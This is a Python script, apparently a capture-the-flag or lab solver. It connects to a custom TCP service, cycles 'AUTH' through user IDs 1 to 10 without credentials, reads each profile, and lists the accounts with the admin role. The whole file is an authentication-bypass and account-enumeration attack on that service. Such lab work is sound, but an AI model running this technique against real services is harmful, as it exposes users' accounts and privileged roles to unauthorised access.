#!/usr/bin/env python3
import os
import re
import socket
import sys
import time


def recv_all(sock: socket.socket, timeout: float = 0.5) -> bytes:
    sock.settimeout(timeout)
    chunks = []
    try:
        while True:
            data = sock.recv(4096)
            if not data:
                break
            chunks.append(data)
            if len(data) < 4096:
                break
    except Exception:
        pass
    return b"".join(chunks)


def send_line(sock: socket.socket, line: str, delay: float = 0.2) -> bytes:
    if not line.endswith("\n"):
        line += "\n"
    sock.sendall(line.encode())
    time.sleep(delay)
    return recv_all(sock, 0.8)


def main() -> None:
    ip = os.environ.get("IP")
    port_str = os.environ.get("PORT")
    if len(sys.argv) >= 3:
        ip = sys.argv[1]
        port_str = sys.argv[2]
    if not ip or not port_str:
        print("Falta IP/PORT", file=sys.stderr)
        sys.exit(2)
    port = int(port_str)

    with socket.create_connection((ip, port), timeout=5) as s:
        _ = recv_all(s, 0.3)
        send_line(s, "RLDB")
        admin_ids = []
        for i in range(1, 11):
            send_line(s, f"AUTH {i}")
            page = send_line(s, "GTPR").decode("utf-8", errors="ignore")
            # Espera líneas del tipo "User: name:role" o "Profile: name:role"
            m = re.search(r"User:\s*(\S+):(\S+)", page)
            n = re.search(r"Profile:\s*(\S+):(\S+)", page)
            user_role = None
            if m:
                user_role = (m.group(1), m.group(2))
            elif n:
                user_role = (n.group(1), n.group(2))
            if user_role:
                u, r = user_role
                print(f"ID {i}: {u}:{r}")
                if r.lower() == "admin":
                    admin_ids.append(i)
        if admin_ids:
            print("ADMIN_IDS:", ",".join(map(str, admin_ids)))
        else:
            print("ADMIN_IDS:")


if __name__ == "__main__":
    main()

